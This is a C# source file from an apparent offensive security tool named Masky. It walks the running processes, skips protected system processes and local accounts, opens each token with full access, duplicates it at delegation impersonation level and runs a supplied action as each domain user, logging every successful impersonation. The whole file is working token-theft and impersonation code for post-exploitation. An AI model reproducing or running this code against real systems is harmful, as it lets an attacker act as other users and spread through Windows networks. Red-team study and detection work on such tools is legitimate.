
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;

using static DInvoke.Data.Native;

namespace Masky {

    public class Impersonate  {

        public Impersonate() {

        }

        static string GetProcessUser(IntPtr processHandle) {
                try
                {
                    WindowsIdentity wi = new WindowsIdentity(processHandle);
                    string user = wi.Name;
                    return user;
                }
                catch
                {
                    return "";
                }
        }

        bool IsPPLExe(string processName) {
            List<string> PPLExe = new List<string>(){"idle","system","registry","smss","csrss","wininit","services"};
            if (PPLExe.Contains(processName.ToLower())) {
                return true;
            }
            return false;
        }

        bool IsLocalUser(string accountName) {
            string strMachineName = System.Environment.MachineName;
            bool isLocal = accountName.ToUpper().Contains(strMachineName.ToUpper());
            if (accountName.ToUpper().Contains("NT AUTHORITY\\")
             || accountName.ToUpper().Contains("WINDOW MANAGER\\")
             || accountName.ToUpper().Contains("NT SERVICE\\")
             || accountName.ToUpper().Contains("HOST\\")) {
                return true;
            }
            return isLocal;
        }

        bool OpenProcess(ref Process process, ref IntPtr hProcToken) {
            try {
                if (Interop.NtOpenProcessToken(
                    process.Handle,
                    Interop.TOKEN_ALL_ACCESS,
                    out hProcToken) == NTSTATUS.Success)
                    return true;
            }
            catch { }

            return false;
        }

        bool DuplicateToken(ref IntPtr hProcToken, ref IntPtr NewhProcToken) {
            Interop.SECURITY_ATTRIBUTES tmp;
            tmp.bInheritHandle = 0;
            tmp.lpSecurityDescriptor = new IntPtr(0);
            tmp.nLength = 0;
            var ret_dup = Interop.DuplicateTokenEx(
                hProcToken,
                Interop.TOKEN_ALL_ACCESS,
                ref tmp,
                Interop.SECURITY_IMPERSONATION_LEVEL.SecurityDelegation,
                Interop.TOKEN_TYPE.TokenImpersonation,
                out NewhProcToken
            );
            return ret_dup;
        }

        bool ExecuteActionWithToken(Action action, ref IntPtr NewhProcToken, ref IntPtr currentProcHH, bool revert) {
            Interop.SetThreadToken(IntPtr.Zero, NewhProcToken);
            bool ret = true;
            try
            {
                action();
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.ToString());
                ret = false;
            }
            if (revert) {
                Interop.SetThreadToken(IntPtr.Zero, currentProcHH);
            }
            return ret;
        }

        bool SaveImpersonationToken(ref IntPtr currentProcHH) {
            Process currentProc = Process.GetCurrentProcess();
            IntPtr currentProcH = IntPtr.Zero;
            OpenProcess(ref currentProc, ref currentProcH);
            DuplicateToken(ref currentProcH, ref currentProcHH);
            return true;
        }

        bool CheckUser(ref List<string> processed_users, ref string current_user) {
            if (processed_users.Contains(current_user.ToLower())) {
                return false;
            }   
            else if (IsLocalUser(current_user)) {
                return false;
            }
            return true;
        }

        bool CheckProcess(ref Process process) {
            if (IsPPLExe(process.ProcessName)) {
                return false;
            } 
            return true;
        }

        bool CloseHandles(ref IntPtr hProcToken, ref IntPtr NewhProcToken) {
            Interop.NtClose(hProcToken);
            Interop.NtClose(NewhProcToken);
            return true;
        }

        public void Run(Action action) {     
            Process[] processes = Process.GetProcesses();
            List<string> processed_users = new List<string>();
            IntPtr currentProcHH = IntPtr.Zero;

            SaveImpersonationToken(ref currentProcHH);

            foreach (Process cur_process in processes) {
                
                IntPtr hProcToken = IntPtr.Zero;
                IntPtr NewhProcToken = IntPtr.Zero;
                Process process = cur_process;

                if (!CheckProcess(ref process)) {
                    continue;
                }

                if (!OpenProcess(ref process, ref hProcToken)) {
                    continue;
                }

                string current_user = GetProcessUser(hProcToken);
                if (!CheckUser(ref processed_users, ref current_user)) {
                    continue;
                }

                if (!DuplicateToken(ref hProcToken, ref NewhProcToken)) {
                    continue;
                }
 
                if (!ExecuteActionWithToken(action, ref NewhProcToken, ref currentProcHH, true))
                {
                    CloseHandles(ref hProcToken, ref NewhProcToken);
                    continue;
                }
                Console.WriteLine("[*] Successful impersonation of: " + current_user);

                processed_users.Add(current_user.ToLower());
                CloseHandles(ref hProcToken, ref NewhProcToken);
            }
        }

    }
}